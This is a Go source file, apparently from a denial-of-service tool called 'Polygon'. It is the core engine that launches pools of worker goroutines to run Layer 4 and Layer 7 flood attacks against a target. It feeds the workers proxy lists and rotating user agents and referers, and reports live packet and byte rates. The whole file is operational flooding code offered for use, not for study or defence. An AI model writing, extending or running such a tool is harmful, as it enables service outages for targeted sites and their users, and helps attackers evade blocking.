// Package core is the central orchestrator: it creates attack workers,
// manages their lifecycle via context, and exposes a unified Engine API.
package core

import (
	"context"
	"log"
	"net"
	"sync"
	"time"

	"Polygon/attack"
	"Polygon/proxy"
	"Polygon/stats"
	"Polygon/tools"
)

// WorkerFunc is a function that runs until ctx is cancelled.
type WorkerFunc func(ctx context.Context)

// Engine coordinates goroutine pools for flood attacks.
type Engine struct {
	mu      sync.Mutex
	workers []context.CancelFunc
}

// Spawn starts n goroutines running fn, all sharing a child of ctx.
func (e *Engine) Spawn(ctx context.Context, n int, fn WorkerFunc) context.CancelFunc {
	child, cancel := context.WithCancel(ctx)
	e.mu.Lock()
	e.workers = append(e.workers, cancel)
	e.mu.Unlock()
	for i := 0; i < n; i++ {
		go fn(child)
	}
	return cancel
}

// StopAll cancels every worker spawned by this engine.
func (e *Engine) StopAll() {
	e.mu.Lock()
	defer e.mu.Unlock()
	for _, cancel := range e.workers {
		cancel()
	}
	e.workers = nil
}

// Layer4Config holds parameters for a Layer 4 flood.
type Layer4Config struct {
	Target     string
	Port       uint16
	Method     string
	Refs       []string
	Proxies    []proxy.Proxy
	ProtocolID int
	Threads    int
	Duration   time.Duration
}

// Layer7Config holds parameters for a Layer 7 flood.
type Layer7Config struct {
	TargetURL  string
	Host       string
	Method     string
	RPC        int
	UserAgents []string
	Referers   []string
	Proxies    []proxy.Proxy
	Threads    int
	Duration   time.Duration
}

// RunLayer4 launches a Layer 4 attack with live stats reporting.
func RunLayer4(cfg Layer4Config) {
	localIPStr, _ := tools.LocalIP()
	localIP := net.ParseIP(localIPStr)

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	engine := &Engine{}
	engine.Spawn(ctx, cfg.Threads, func(ctx context.Context) {
		l4 := &attack.Layer4{
			Target:     cfg.Target,
			Port:       cfg.Port,
			Method:     cfg.Method,
			Refs:       cfg.Refs,
			Proxies:    cfg.Proxies,
			ProtocolID: cfg.ProtocolID,
			LocalIP:    localIP,
		}
		l4.Run(ctx)
	})

	statsLoop(ctx, cfg.Target, cfg.Method, int(cfg.Duration.Seconds()))
}

// RunLayer7 launches a Layer 7 attack with live stats reporting.
func RunLayer7(cfg Layer7Config) {
	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	engine := &Engine{}
	engine.Spawn(ctx, cfg.Threads, func(ctx context.Context) {
		flood := &attack.HttpFlood{
			TargetURL:  cfg.TargetURL,
			Host:       cfg.Host,
			Method:     cfg.Method,
			RPC:        cfg.RPC,
			UserAgents: cfg.UserAgents,
			Referers:   cfg.Referers,
			Proxies:    cfg.Proxies,
		}
		flood.Run(ctx)
	})

	statsLoop(ctx, cfg.TargetURL, cfg.Method, int(cfg.Duration.Seconds()))
}

func statsLoop(ctx context.Context, target, method string, totalSec int) {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	start := time.Now()
	for {
		select {
		case <-ctx.Done():
			reqs, bytes := stats.Snapshot()
			log.Printf("[done] %s | %s | total PPS=%s BPS=%s",
				target, method,
				tools.HumanFormat(reqs), tools.HumanBytes(bytes))
			return
		case <-ticker.C:
			reqs, bytes := stats.Snapshot()
			stats.Reset()
			elapsed := int(time.Since(start).Seconds())
			pct := 0
			if totalSec > 0 {
				pct = elapsed * 100 / totalSec
			}
			log.Printf("[%d%%] target=%s method=%s pps=%s bps=%s",
				pct, target, method,
				tools.HumanFormat(reqs), tools.HumanBytes(bytes))
		}
	}
}
